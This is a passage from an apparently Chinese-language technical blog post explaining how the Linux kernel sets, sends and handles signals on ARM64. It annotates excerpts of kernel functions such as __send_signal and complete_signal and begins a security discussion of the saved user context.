mask; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 若非有效信号（[1,64] 之外的信号），或是不可屏蔽信号则返回错误。不可屏蔽信号（SIG_KILL/SIG_STOP）不能设置 handler */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">valid_signal</span>(sig) || sig &lt; <span class="number">1</span> || (act &amp;&amp; <span class="built_in">sig_kernel_only</span>(sig)))</span><br><span class="line">        <span class="keyword">return</span> -EINVAL; </span><br><span class="line">    k = &amp;p-&gt;sighand-&gt;action[sig<span class="number">-1</span>]; <span class="comment">/* 获取当前线程组中此信号的 action 数组 */</span> </span><br><span class="line">    <span class="keyword">if</span> (oact) <span class="comment">/* 如果需要获取旧的信号处理信息，则通过 oact 返回 */</span></span><br><span class="line">        *oact = *k;</span><br><span class="line">    .......</span><br><span class="line">    <span class="keyword">if</span> (act) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*  传入的 sa_mask 为此信号处理函数执行过程中需要屏蔽的其他信号, SIGKILL/SIGSTOP 总是不可屏蔽信号，需要去除 */</span></span><br><span class="line">        <span class="built_in">sigdelsetmask</span>(&amp;act-&gt;sa.sa_mask, <span class="built_in">sigmask</span>(SIGKILL) | <span class="built_in">sigmask</span>(SIGSTOP)); </span><br><span class="line">        *k = *act; <span class="comment">/* 将新的 action 结构体复制到线程组此信号的 action 结构体中, 信号处理函数设置完毕 */</span> </span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        如果当前信号被设置为要忽略（此信号 handler 设置为 SIG_IGN, 或设置为 SIG_DFL 且此信号默认行为是忽略）， 则需要同时删除此线程所在线程组中所有信号队列中已经收到的所有此信号。这包括线程组的 shared_pending 和各个线程自身的 pending 队列中：</span></span><br><span class="line"><span class="comment">            * 已经加入队列的信号结构体（sigqueue）的删除</span></span><br><span class="line"><span class="comment">            * 清除这些队列自身 sigpending-&gt;signal 中此 sig 的掩码</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">sig_handler_ignored</span>(<span class="built_in">sig_handler</span>(p, sig), sig)) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">sigemptyset</span>(&amp;mask); <span class="comment">/* 生成此信号对应的掩码 */</span></span><br><span class="line">            <span class="built_in">sigaddset</span>(&amp;mask, sig); </span><br><span class="line">            <span class="built_in">flush_sigqueue_mask</span>(&amp;mask, &amp;p-&gt;signal-&gt;shared_pending); <span class="comment">/* 删除 shared_pending 中已有的所有此信号 */</span></span><br><span class="line">            for_each_thread(p, t) <span class="built_in">flush_sigqueue_mask</span>(&amp;mask, &amp;t-&gt;pending); <span class="comment">/* 同时删除线程组各个线程中的此信号 */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h1 id="三、信号的发送"><a href="#三、信号的发送" class="headerlink" title="三、信号的发送"></a>三、信号的发送</h1><p>这里以用户态入口系统调用 sys_kill 为例，其定义如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SYSCALL_DEFINE2</span>(kill, <span class="keyword">pid_t</span>, pid, <span class="keyword">int</span>, sig)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kernel_siginfo</span> <span class="title">info</span>;</span> <span class="comment">/* 为 signal 准备 kernel_siginfo 结构体*/</span></span><br><span class="line">    <span class="built_in">prepare_kill_siginfo</span>(sig, &amp;info); </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">kill_something_info</span>(sig, &amp;info, pid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">kill_something_info</span><span class="params">(<span class="keyword">int</span> sig, struct kernel_siginfo *info, <span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret; </span><br><span class="line">    <span class="keyword">if</span> (pid &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">kill_proc_info</span>(sig, info, pid); </span><br><span class="line">    <span class="comment">/* 若 pid &gt; 0 ，则向此 pid 对应的线程组发送信号 */</span></span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里以 pid&gt;0 为例，kill_proc_info 函数会依次调用到 _send_signal 处理信号，在此过程中会调用 check_kill_permission 检查发送权限</span></span><br><span class="line"><span class="comment">// kill_proc_info =&gt; kill_pid_info =&gt; group_send_sig_info =&gt; do_send_sig_info =&gt; send_signal</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   sig: 要发送的信号</span></span><br><span class="line"><span class="comment">   t: 信号要发送到哪个 task</span></span><br><span class="line"><span class="comment">   type: 信号是否要同时发给此 task 所在的线程组/进程组/会话，若为 PIDTYPE_PID 则代表信号只发给当前 task（线程）</span></span><br><span class="line"><span class="comment">   force: 若信号来自内核或祖先 namespace，则 force 为 true</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __send_signal(<span class="keyword">int</span> sig, struct kernel_siginfo *info, struct task_struct *t,</span><br><span class="line">            <span class="keyword">enum</span> pid_type type, <span class="keyword">bool</span> force)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigpending</span> *<span class="title">pending</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigqueue</span> *<span class="title">q</span>;</span></span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>, result;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">/* 若当前信号是线程组要忽略的信号，则这里直接返回；此函数中还预处理了 stop/continue 信号的关系 */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">prepare_signal</span>(sig, t, force))  <span class="keyword">goto</span> ret;</span><br><span class="line">     </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       若信号是发给特定线程的（type = PIDTYPE_PID），则使用 t-&gt;pending（当前线程的 pending 队列）</span></span><br><span class="line"><span class="comment">       若信号是发给线程组/会话的，则使用 shared_pending（共享的存储 pending 的队列）</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    pending = (type != PIDTYPE_PID) ? &amp;t-&gt;signal-&gt;shared_pending : &amp;t-&gt;pending;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">       非 ignore 的信号也不一定总是要插入信号队列：</span></span><br><span class="line"><span class="comment">        * 对于非实时信号，如果 pending 队列中已有此信号则不必重复添加，直接返回</span></span><br><span class="line"><span class="comment">        * 对于实时信号和未曾添加过的信号，则向队列中添加此信号</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">legacy_queue</span>(pending, sig))</span><br><span class="line">        <span class="keyword">goto</span> ret;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">if</span> ((sig == SIGKILL) || (t-&gt;flags &amp; PF_KTHREAD))  <span class="comment">/* 不可向内核线程发送 SIGKILL 信号 */</span></span><br><span class="line">        <span class="keyword">goto</span> out_set;</span><br><span class="line">    ......</span><br><span class="line">    q = __sigqueue_alloc(sig, t, GFP_ATOMIC, override_rlimit, <span class="number">0</span>); <span class="comment">/* 分配存储此信号信息的 sigqueue 结构体 */</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (q) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">list_add_tail</span>(&amp;q-&gt;list, &amp;pending-&gt;list);                 <span class="comment">/* 将信号添加到 sigpending 队列的末尾 */</span></span><br><span class="line">        ......</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        ......</span><br><span class="line"> </span><br><span class="line">out_set:</span><br><span class="line">    <span class="built_in">signalfd_notify</span>(t, sig);                           <span class="comment">/* 支持 signalfs 的信号通知链 */</span></span><br><span class="line">    <span class="built_in">sigaddset</span>(&amp;pending-&gt;signal, sig);                   <span class="comment">/* 将信号加入 pending 队列的信号掩码中，此掩码用来快速判断当前队列收到了哪些信号 */</span></span><br><span class="line">    <span class="keyword">if</span> (type &gt; PIDTYPE_TGID)     <span class="comment">/* 如果此信号是发送到信号组或 session 的 */</span></span><br><span class="line">    &#123;                          </span><br><span class="line">        .......</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">complete_signal</span>(sig, t, type);                        <span class="comment">/* 若信号没有被 block 等情况下, 为当前线程标记 TIF_SIGPENDING */</span></span><br><span class="line">ret:</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 prepare_signal 定义如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">prepare_signal</span><span class="params">(<span class="keyword">int</span> sig, struct task_struct *p, <span class="keyword">bool</span> force)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">signal_struct</span> *<span class="title">signal</span> =</span> p-&gt;signal;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">t</span>;</span></span><br><span class="line">    <span class="keyword">sigset_t</span> flush;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (signal-&gt;flags &amp; (SIGNAL_GROUP_EXIT | SIGNAL_GROUP_COREDUMP)) </span><br><span class="line">    &#123; <span class="comment">/* 如果线程组正在退出过程中, 则此信号变为 SIGKILL */</span></span><br><span class="line">        <span class="keyword">if</span> (!(signal-&gt;flags &amp; SIGNAL_GROUP_EXIT))</span><br><span class="line">            <span class="keyword">return</span> sig == SIGKILL;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">sig_kernel_stop</span>(sig)) </span><br><span class="line">    &#123;  <span class="comment">/* 如果线程收到 stop 信号，则移除已有的所有 continue 信号 */</span></span><br><span class="line">        .......</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sig == SIGCONT) </span><br><span class="line">    &#123;      <span class="comment">/* 若收到 continue 信号则唤醒线程 */</span> </span><br><span class="line">        .......</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> !<span class="built_in">sig_ignored</span>(p, sig, force);  <span class="comment">/* 如果此信号不被忽略，则返回 true */</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">sig_ignored</span><span class="params">(struct task_struct *t, <span class="keyword">int</span> sig, <span class="keyword">bool</span> force)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       若线程已经设置了此信号的 blocked 掩码，则说明此信号只是被 block 了，不能忽略此时不会判断 handler 是否为 SIG_IGN。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sigismember</span>(&amp;t-&gt;blocked, sig) || <span class="built_in">sigismember</span>(&amp;t-&gt;real_blocked, sig))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    .......</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sig_task_ignored</span>(t, sig, force);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">sig_task_ignored</span><span class="params">(struct task_struct *t, <span class="keyword">int</span> sig, <span class="keyword">bool</span> force)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> __user *handler;</span><br><span class="line">    handler = <span class="built_in">sig_handler</span>(t, sig);   <span class="comment">/* 获取信号 handler */</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* SIGKILL/SIGSTOP 不能发送给全局 init 进程 */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">unlikely</span>(<span class="built_in">is_global_init</span>(t) &amp;&amp; <span class="built_in">sig_kernel_only</span>(sig)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    .......</span><br><span class="line">    <span class="comment">/* 若向内核线程发送信号时此内核线程指定了 SIG_KTHREAD_KERNEL，则只有内核可向其发送信号 */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">unlikely</span>((t-&gt;flags &amp; PF_KTHREAD) &amp;&amp; (handler == SIG_KTHREAD_KERNEL) &amp;&amp; !force))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* handler 为 SIG_IGN；或为 SIG_DFL 但默认处理方式为 ignore 的信号直接忽略 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sig_handler_ignored</span>(handler, sig);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 complete_signal 函数定义如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">complete_signal</span><span class="params">(<span class="keyword">int</span> sig, struct task_struct *p, <span class="keyword">enum</span> pid_type type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">signal_struct</span> *<span class="title">signal</span> =</span> p-&gt;signal;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">t</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">wants_signal</span>(sig, p))     <span class="comment">/* 此函数返回 true（即此线程希望收到信号），则后续需要为线程 p 标记 p-&gt;flags |= TIF_SIGPENDING */</span></span><br><span class="line">        t = p;</span><br><span class="line">    <span class="comment">/* 若当前线程暂时不想收到信号，且此信号只能此线程接收。包括两种情况：1) 此信号就是发送给当前线程的; 2) 其线程组中没有其他线程;</span></span><br><span class="line"><span class="comment">      则此时不设置 TIF_SIGPENDING 直接返回 */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((type == PIDTYPE_PID) || <span class="built_in">thread_group_empty</span>(p))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;                         <span class="comment">/* 否则找到线程组中一个可以处理此信号的线程并向其发送信号 */</span></span><br><span class="line">        t = signal-&gt;curr_target;</span><br><span class="line">        <span class="keyword">while</span> (!<span class="built_in">wants_signal</span>(sig, t)) </span><br><span class="line">        &#123;</span><br><span class="line">            t = <span class="built_in">next_thread</span>(t);</span><br><span class="line">            <span class="keyword">if</span> (t == signal-&gt;curr_target)</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        signal-&gt;curr_target = t;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    ......</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">signal_wake_up</span>(t, sig == SIGKILL);   <span class="comment">/* 为线程 t 标记  TIF_SIGPENDING */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">wants_signal</span><span class="params">(<span class="keyword">int</span> sig, struct task_struct *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sigismember</span>(&amp;p-&gt;blocked, sig))     <span class="comment">/* 若 task p block 了信号 sig，则此时无需为其设置 TIF_SIGPENDING */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (p-&gt;flags &amp; PF_EXITING)                <span class="comment">/* 若当前进程正在退出，则不再需要 signal */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">         </span><br><span class="line">    <span class="keyword">if</span> (sig == SIGKILL)                      <span class="comment">/* SIGKILL 信号总是无法 block（在设置信号时会确保 blocked 掩码中未屏蔽 SIGKILL/SIGSTOP */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">task_is_stopped_or_traced</span>(p))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">task_curr</span>(p) || !<span class="built_in">task_sigpending</span>(p);  <span class="comment">/* 已有 TIF_SIGPENDING 的进程无需重新设置 */</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">signal_wake_up</span><span class="params">(struct task_struct *t, <span class="keyword">bool</span> resume)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">signal_wake_up_state</span>(t, resume ? TASK_WAKEKILL : <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">signal_wake_up_state</span><span class="params">(struct task_struct *t, <span class="keyword">unsigned</span> <span class="keyword">int</span> state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="comment">/* 标记线程 t 中有信号需要处理 */</span></span><br><span class="line">    <span class="built_in">set_tsk_thread_flag</span>(t, TIF_SIGPENDING);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 唤醒线程 t */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">wake_up_state</span>(t, state | TASK_INTERRUPTIBLE))</span><br><span class="line">        <span class="built_in">kick_process</span>(t);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="四、信号的处理与等待"><a href="#四、信号的处理与等待" class="headerlink" title="四、信号的处理与等待"></a>四、信号的处理与等待</h1><h2 id="4-1-信号处理概述"><a href="#4-1-信号处理概述" class="headerlink" title="4.1 信号处理概述"></a>4.1 信号处理概述</h2><h3 id="1-信号处理的时机"><a href="#1-信号处理的时机" class="headerlink" title="1. 信号处理的时机"></a>1. 信号处理的时机</h3><p>由前可知，信号发送操作除了将具体信号设置到线程的共享/私有队列外，还会为此线程标记 TIF_SIGPENDING flags（若当前线程 block 了信号，则有可能会发送给线程组其他线程），<strong>不论线程收到了多少个信号都会通过这一个 flag 标记, 只要线程的 tsk-&gt;flags 标记了 TIF_SIGPENDING 则就说明此线程收到了信号</strong>。</p>
<p>  内核在检查是否有信号到达时同样检查的也是线程的 TIF_SIGPENDING flag, 内核中的信号处理可以分为两种场景：</p>
<ol>
<li><p>内核返回用户态时检查并处理信号</p>
<p> 由于信号在多大多数情况下是给用户态进程使用的，故比较常见的是此场景, 通常从 EL0 异常入口进入内核并返回到用户态之前都会检查当前线程是否有要处理的信号, 如：</p>
<ul>
<li>EL0 同步异常, 如 EL0 发起的系统调用, 指令/数据访问错误。</li>
<li>EL0 异步异常, 如 EL0 时发生的 IRQ 中断。</li>
</ul>
</li>
<li><p>内核线程通过循环检查自身的信号</p>
<p> 这种场景比较少见, 偶尔出现在一些需要与用户态交互的内核线程中，此时内核线程可以决定只接受内核发送的信号（SIG_KTHREAD），也可以接受用户态信号（SIG_KTHREAD）。和用户态显著的区别在于，内核信号更类似一个个 case，其不能指定信号处理函数，内核线程中需要自己实现代码来循环检测是否有信号出现（内核线程不会执行到 1 的流程，故若收到信号必须主动处理） 在情景 1/2 中内核均通过类似 <strong>signal_pending</strong> 的逻辑判断当前线程是否有需要处理的信号。</p>
</li>
</ol>
<h3 id="2-信号处理流程描述"><a href="#2-信号处理流程描述" class="headerlink" title="2. 信号处理流程描述"></a>2. 信号处理流程描述</h3><p>内核在返回用户态之前检查并处理信号, 当前线程首先会无视（不忽略也不处理）其自身阻塞的信号，对于未被阻塞的信号分为三种情况：</p>
<ol>
<li><p>使用默认行为的信号（SIG_DFL）</p>
<ul>
<li>如果默认行为是忽略此信号，则内核直接忽略此信号</li>
<li>如果默认行为是终止/停止/继续，则内核直接处理</li>
</ul>
</li>
<li><p>直接忽略的信号（SIG_IGN）</p>
<ul>
<li>内核直接忽略标记为忽略的信号</li>
</ul>
</li>
<li><p>需要执行 handler 的信号</p>
<ul>
<li>内核需要在信号栈保存当前用户态上下文，并为用户态重置一个信号上下文</li>
<li>内核返回用户态后执行信号上下文（即信号处理函数），执行完毕后通过 ret 指令返回</li>
<li>信号上下文会直接返回到系统调用 sys_rt_sigreturn，此系统调用中恢复之前的用户态上下文</li>
<li>内核再次返回用户态，恢复用户态上下文执行</li>
</ul>
</li>
</ol>
<p>需要注意的是：</p>
<ol>
<li><p>阻塞是以线程为单位的：<br>线程组共享的信号（常规信号）被一个线程阻塞并不代表其不能被处理, 同一线程组的任一其他线程均可处理此信号。</p>
</li>
<li><p>用户态上下文：<br>用户态代码执行到任意位置时都有可能有异常触发, 不论是同步/异步异常在返回时都会检查当前进程是否有信号要处理，对于需要执行信号处理函数的信号其被中断前的<strong>用户态上下文</strong>必须得以保存，否则信号处理函数执行完毕后无法恢复原有运行环境。 在 linux 中此用户态上下文是被在异常发生时存储，在信号处理函数执行的过程中被保存在用户/信号栈中的，在信号处理完毕后同样需要从栈中恢复。</p>
</li>
<li><p>信号上下文：<br>信号上下文指的是信号处理函数的上下文，主要包括：</p>
<ul>
<li>  PC：即信号处理函数的指针</li>
<li>  SP：信号处理函数可以使用当前用户线程的栈，也可以单独指定一个信号栈（后面以线程栈为例）； 内核在执行信号处理函数前会在栈上保存用户上下文以便执行完毕后的恢复</li>
<li>  LR：信号处理函数也是一个普通函数, 其通过 ret 指令返回，内核则需要让信号处理函数返回时执行 sys_rt_sigreturn 来恢复用用户态上下文, 故内核需要将信号处理函数的返回地址设置为 sys_rt_sigreturn 函数地址。</li>
</ul>
</li>
<li><p>当异常返回前发现多个信号处理函数时：<br>异常返回前会循环遍历<strong>所有未被当前线程 block 的信号</strong>，如果有多个信号均需要执行信号处理函数，那么内核会在进程栈中依次堆叠多个信号栈帧, 如某线程依次收到了需要执行 handler 的 sig1/sig2 两个信号, 则内核会先为 sig1 设置栈帧，然后为 sig2 设置栈帧。<strong>而最终用户态的执行流程是 sig2_handler =&gt; sys_rt_sigreturn =&gt; sig1_handler =&gt; sys_rt_sigreturn =&gt; 用户态上下文</strong>， 即<strong>后到的信号被优先处理</strong>（举例见备注）。</p>
</li>
<li><p>当信号处理函数执行过程中再次被信号中断时：<br>若用户态正在执行信号处理函数，此时没有被当前线程 block 的信号可能导致此信号处理程序被再次中断，同样是后到的信号被优先处理，但不同的是此时可能导致竞态死锁问题（信号处理函数需要设计为可重入）。</p>
</li>
<li><p>安全性分析：</p>
</li>
</ol>
<p>这里的安全性分析仅针信号处理过程中是否会导致权限提升，并不针对如 SROP 等利用信号处理的利用方式。信号处理的过程中在用户栈中保存了用户态上下文，在信号处理完成后需要内核（sys_rt_sigreturn）为用户态恢复此上下文,用户态上下文的数据包括：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ucontext</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>    uc_flags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext</span>     *<span class="title">uc_link</span>;</span></span><br><span class="line">    <span class="keyword">stack_t</span>       uc_stack;        </span><br><span class="line">    <span class="keyword">sigset_t</span>      uc_sigmask;     <span class="comment">/* 重置的 block 掩码 */</span></span><br><span class="line">    __u8          __unused[<span class="number">1024</span> / <span class="number">8</span> - <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">sigset_t</span>)];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span> <span class="title">uc_mcontext</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __u64 fault_address;</span><br><span class="line">    __u64 regs[<span class="number">31</span>];                    <span class="comment">/* 通用寄存器 */</span></span><br><span class="line">    __u64 sp;</span><br><span class="line">    __u64 pc;</span><br><span class="line">    __u64 pstate;                  <span class="comment">/* pstate 状态寄存器 */</span></span><br><span class="line">    __u8 __reserved[<span class="number">4096</span>];         <span 